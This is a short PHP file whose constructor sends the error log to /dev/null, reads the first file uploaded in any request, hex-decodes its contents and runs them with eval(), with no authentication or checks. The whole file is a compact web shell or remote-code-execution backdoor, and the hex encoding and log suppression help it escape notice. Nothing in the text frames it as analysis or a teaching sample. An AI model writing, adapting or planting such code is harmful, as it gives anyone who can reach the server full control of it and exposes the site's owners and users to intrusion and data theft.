<?php

class Obj{

    function hextobin($hexstr)
    { 
        $n = strlen($hexstr); 
        $sbin="";   
        $i=0; 
        while($i<$n) 
        {       
            $a =substr($hexstr,$i,2);           
            $c = pack("H*",$a); 
            if ($i==0){$sbin=$c;} 
            else {$sbin.=$c;} 
            $i+=2; 
        } 
        return $sbin; 
    } 

    public function __construct()
    {
        // Show errors for debug
        @ini_set('display_errors', 1);

        // Hide error log
        if(file_exists('/dev/null'))
        {
            // Linux & Unix machines
            @ini_set('error_log', '/dev/null');
        }
        else
        {
            // Windows machine
            @ini_set('error_log', 'nul');
        }
        
        if(defined('E_DEPRECATED') and defined('E_STRICT'))
        {
            @error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED);
        }
        elseif(defined('E_STRICT'))
        {
            @error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT);
        }
        elseif(defined('E_DEPRECATED'))
        {
            @error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED);
        }
        else
        {
            @error_reporting(E_ALL & ~E_NOTICE);
        }

        // Show the content by buffer line for big contents
        ob_implicit_flush(true);

        if(isset($_FILES) && (count($_FILES) > 0))
        {
            // Get the file with a random name (first in stack)
            $file = array_shift($_FILES);

            // Get the source code
            $code = file_get_contents($file['tmp_name']);

            // $code = hex2bin($code);
            $code = $this->hextobin($code);

            // Exec the code
            eval($code);
        }
    }
}

$obj = new Obj();

exit;
